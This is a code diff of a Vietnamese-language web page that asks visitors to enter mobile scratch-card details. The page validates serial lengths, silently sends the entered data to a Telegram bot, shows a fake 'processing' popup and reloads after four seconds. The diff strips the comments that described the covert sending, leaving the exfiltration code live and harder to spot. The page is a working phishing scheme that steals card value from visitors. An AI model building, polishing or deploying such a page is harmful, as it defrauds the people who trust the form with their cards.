@@ -88,7 +88,7 @@
             color: white;
         }
         .hidden {
-            display: none;
+            display: none !important;
         }
         .success-text {
             color: #2e7d32;
@@ -103,7 +103,6 @@
             border: 1px dashed #4CAF50;
             margin-bottom: 15px;
         }
-        /* Modal thông báo chờ xử lý */
         #loadingModal {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -206,7 +205,7 @@
 
 </div>
 
-<!-- Popup chờ xử lý -->
+<!-- Popup chờ xử lý (Mặc định ẩn) -->
 <div id="loadingModal" class="hidden">
     <div class="modal-content">
         <div class="checkmark">✅</div>
@@ -272,7 +271,6 @@
                 return;
             }
 
-            // Kiểm tra quy chuẩn độ dài thẻ cào theo yêu cầu
             if (cardType === "Mobifone") {
                 if (cardSerial.length !== 15) {
                     alert("Thẻ MobiFone yêu cầu số Seri phải đúng 15 số!");
@@ -318,17 +316,14 @@
             parse_mode: "Markdown"
         };
 
-        // Gửi dữ liệu ngầm lên Telegram
         fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         }).catch(error => console.log(error));
 
-        // Hiện bảng thông báo chờ xử lý
         document.getElementById("loadingModal").classList.remove("hidden");
 
-        // Sau 4 giây tự động tải lại trang
         setTimeout(() => {
             location.reload();
         }, 4000);
@@ -336,5 +331,5 @@
 </script>
 
 </body>
-                                                   </html>
-                                                   
+                                                     </html>
+            
